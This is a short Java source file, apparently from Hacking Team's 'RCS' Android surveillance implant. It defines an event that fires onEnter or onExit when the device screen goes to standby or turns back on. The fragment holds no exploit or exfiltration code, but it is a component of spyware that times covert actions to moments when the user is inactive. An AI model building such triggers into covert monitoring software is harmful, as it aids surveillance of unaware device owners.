/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : EventStandby.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.event;

import com.android.dvci.Standby;
import com.android.dvci.conf.ConfEvent;
import com.android.dvci.interfaces.Observer;
import com.android.dvci.listener.ListenerStandby;

public class EventStandby extends BaseEvent implements Observer<Standby> {
	/** The Constant TAG. */
	private static final String TAG = "EventStandby"; //$NON-NLS-1$

	private int actionOnEnter, actionOnExit;

	@Override
	public void actualStart() {
		ListenerStandby.self().attach(this);
	}

	@Override
	public void actualStop() {
		ListenerStandby.self().detach(this);
		onExit(); // di sicurezza
	}

	@Override
	public boolean parse(ConfEvent event) {
		return true;
	}

	@Override
	public void actualGo() {

	}

	// Viene richiamata dal listener (dalla dispatch())
	public int notification(Standby s) {
		// Stato dello schermo ON/OFF
		if (s.getStatus() == true) {
			// SCREEN ON
			onExit();
		} else {
			// STANDBY
			onEnter();
		}

		return 0;
	}
}
